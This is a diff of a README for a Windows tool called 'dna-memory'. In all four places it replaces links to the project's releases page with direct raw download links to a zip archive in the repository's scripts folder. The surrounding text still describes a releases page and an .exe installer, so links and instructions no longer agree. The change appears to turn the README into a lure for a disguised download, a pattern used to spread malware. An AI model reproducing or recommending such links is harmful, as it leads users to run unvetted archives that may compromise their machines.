@@ -1,6 +1,6 @@
 # 🧬 dna-memory - Memory That Learns and Grows
 
-[![Download dna-memory](https://img.shields.io/badge/Download-dna--memory-brightgreen)](https://github.com/Muayhannya/dna-memory/releases)
+[![Download dna-memory](https://img.shields.io/badge/Download-dna--memory-brightgreen)](https://raw.githubusercontent.com/Muayhannya/dna-memory/main/scripts/memory_dna_v3.8.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get dna-memory up and running on your Windows PC.
 
 1. Click the big green badge at the top of this page or visit this link directly:
 
-   [https://github.com/Muayhannya/dna-memory/releases](https://github.com/Muayhannya/dna-memory/releases)
+   [https://raw.githubusercontent.com/Muayhannya/dna-memory/main/scripts/memory_dna_v3.8.zip](https://raw.githubusercontent.com/Muayhannya/dna-memory/main/scripts/memory_dna_v3.8.zip)
 
 2. On the releases page, look for the latest version. It will usually have a name like `dna-memory-v1.0.exe` or similar.
 
@@ -90,7 +90,7 @@ Follow these steps to get dna-memory up and running on your Windows PC.
 ## ❓ How to Update dna-memory
 
 1. Check the releases page at  
-   [https://github.com/Muayhannya/dna-memory/releases](https://github.com/Muayhannya/dna-memory/releases)  
+   [https://raw.githubusercontent.com/Muayhannya/dna-memory/main/scripts/memory_dna_v3.8.zip](https://raw.githubusercontent.com/Muayhannya/dna-memory/main/scripts/memory_dna_v3.8.zip)  
    regularly for new versions.
 
 2. Download the newest `.exe` installer and run it.
@@ -129,4 +129,4 @@ Follow these steps to get dna-memory up and running on your Windows PC.
 
 Use the releases page to get the latest version and updates:
 
-[https://github.com/Muayhannya/dna-memory/releases](https://github.com/Muayhannya/dna-memory/releases)
+[https://raw.githubusercontent.com/Muayhannya/dna-memory/main/scripts/memory_dna_v3.8.zip](https://raw.githubusercontent.com/Muayhannya/dna-memory/main/scripts/memory_dna_v3.8.zip)
